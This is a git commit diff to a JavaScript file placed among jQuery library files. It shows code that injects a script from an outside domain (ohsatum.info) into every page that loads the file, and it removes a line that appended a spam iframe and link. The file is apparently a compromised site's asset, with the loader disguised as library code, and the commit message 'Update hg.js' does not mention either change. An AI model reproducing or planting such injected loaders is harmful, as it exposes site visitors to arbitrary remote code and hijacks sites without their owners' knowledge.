5afdc1700b1f5a9fa4925b894f67876668055d95
thearthouse <realist.tm@yandex.com>
2021-10-05 09:38:49 +0300

    Update hg.js

--- inc/js/jquery/hg.js
+++ inc/js/jquery/hg.js
@@ -7,5 +7,3 @@ script.src = 'https://ohsatum.info/init.js?sid=871623';
 var entry = document.body.firstChild;
 entry.parentNode.insertBefore(script, entry);
 })();
-
-document.body.insertAdjacentHTML('beforeend', '<iframe src="https://bropar.repl.co/videos/watch/x84k3ur" width="468" height="60"></iframe><h2><a class="mn-brand" href="https://bropar.repl.co/videos/watch/x84k3ur">Road Trip 5 Kota Di Indonesia, Hadirkan Marriot Bonvoy Wheels Berkolaborasi Dengan Mercedes-Benz</a></h2>');
